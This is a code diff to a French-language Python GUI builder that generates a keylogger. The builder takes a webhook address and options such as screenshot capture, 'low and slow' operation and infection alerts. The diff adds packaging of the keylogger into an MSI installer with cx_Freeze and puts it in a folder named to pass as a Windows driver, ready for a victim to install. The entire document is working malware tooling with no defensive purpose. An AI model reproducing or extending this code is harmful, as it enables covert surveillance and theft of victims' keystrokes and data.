@@ -4,6 +4,7 @@ import time
 import customtkinter as ctk
 from tkinter import messagebox
 import requests
+import shutil
 import json
 import os
 from datetime import datetime
@@ -11,6 +12,10 @@ import clipboard
 import threading
 from PIL import ImageGrab
 import io
+import cx_Freeze
+
+
+
 
 historique = []
 capture_apres_at = False
@@ -171,13 +176,26 @@ def test_webhook():
 
 # ---------------- BUILDER ----------------
 def lancer_programme():
+
+    if switch.get() == 1:
+        pyw()
+    else:
+        msi()
+
+
+
+
+def pyw():
     global nom_fichier
+    global temp_script
+
+    messagebox.showinfo(message="Vous allez générer uniquement le keyloger en .pyw qui fonctionnera dès l'execution")
 
     if nom_fichier.strip() == "":
         messagebox.showerror("Erreur", "Nom du fichier vide")
         return
 
-    filename = f"{nom_fichier}.pyw"
+    temp_script = f"{nom_fichier}.pyw"
 
     config = {
         "webhook": webhook_entry.get().strip(),
@@ -197,7 +215,7 @@ def lancer_programme():
         return
 
     # Fichier est maintenant écrit DANS le with open()
-    with open(filename, "w", encoding="utf-8") as f:
+    with open(temp_script, "w", encoding="utf-8") as f:
         f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
         f.write("OPTIONS = {\n")
         for option, valeur in config["options"].items():
@@ -272,11 +290,59 @@ def lancer_programme():
             if val:
                 f.write(f"    threading.Thread(target={opt}_option_func).start()\n")
 
-    messagebox.showinfo("Succès", f"✅ Fichier '{filename}' créé avec succès !")
-    app.destroy()
 
-    messagebox.showinfo("Succès", f"✅ Fichier '{filename}' créé avec les options sélectionnées.")
-    app.destroy()
+        messagebox.showinfo(title="Fini", message="Le fichier a été créer avec succès")
+
+
+def msi():
+    messagebox.showwarning(message="Vous allez généré le .msi")
+        
+    messagebox.showinfo(title="Ne pas fermer", message="L'application risque de planter mais elle met en place le .msi, NE FERMEZ PAS ! ")
+    
+
+    # --- 2) Création du setup_msi.py temporaire ---
+    setup_filename = "setup_msi.py"
+    with open(setup_filename, "w", encoding="utf-8") as f:
+        f.write(
+            "from cx_Freeze import setup, Executable\n"
+            f"setup(name='{nom_fichier}', version='1.0', description='Programme créé avec le builder', executables=[Executable('{temp_script}')])\n"
+        )
+
+    time.sleep(2)
+    messagebox.showwarning(message="Installation du MSI. Ne quittez pas")
+
+    # Génération du MSI
+    os.system(f"python {setup_filename} bdist_msi")
+
+    # Deplacement du msi dans Windows-driver
+    dist_dir = "dist"
+    output_dir = "Windows-driver-x64msi"
+    os.makedirs(output_dir, exist_ok=True)
+
+    # Cherche le .msi généré
+    msi_files = [f for f in os.listdir(dist_dir) if f.endswith(".msi")]
+    if not msi_files:
+        messagebox.showerror("Erreur", "Aucun MSI généré !")
+        return
+
+    for msi in msi_files:
+        shutil.move(os.path.join(dist_dir, msi), os.path.join(output_dir, msi))
+
+    time.sleep(3)
+    messagebox.showwarning("Nettoyage de fichier temporaire. NE QUITTEZ PAS !")
+
+    # --- 5) Nettoyage des fichiers temporaires ---
+    for file in [temp_script, setup_filename]:
+        if os.path.exists(file):
+            os.remove(file)
+    # Supprimer dossiers build/ et dist/ si vide
+    if os.path.exists("build"):
+        shutil.rmtree("build")
+    if os.path.exists("dist"):
+        shutil.rmtree("dist")
+
+    messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation par l'utilisateur !")
+    
 
 # ---------------- INTERFACE ----------------
 app = ctk.CTk()
@@ -307,6 +373,14 @@ capture_var = ctk.BooleanVar(value=False)
 low_slow_var = ctk.BooleanVar(value=False)
 alert_var = ctk.BooleanVar(value=False)
 
+def text():
+    if switch.get() == 1:
+        jsp.set(".pyw")
+    else:
+        jsp.set(".msi")
+
+jsp = ctk.StringVar(value=".msi")
+
 # Cases à cocher
 choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs (Obligatoire)", variable=choix_nom_var, command=nom_keylogs)
 choix_nom.pack(pady=5)
@@ -324,9 +398,16 @@ low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow (En développement
 low_and_slow_option.pack(pady=5)
 alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination (En développement)", variable=alert_var, command=alert_on_infection_option_func)
 alert_on_infection_option.pack(pady=5)
+switch = ctk.CTkSwitch(app, textvariable=jsp, command=text)
+switch.pack()
+
+
 
 # Bouton lancer
 lancer_btn = ctk.CTkButton(app, text="Lancer le programme", font=ctk.CTkFont(size=16, weight="bold"), command=lancer_programme)
 lancer_btn.pack(pady=20)
 
-app.mainloop()
+def key():
+    app.mainloop()
+
+key()
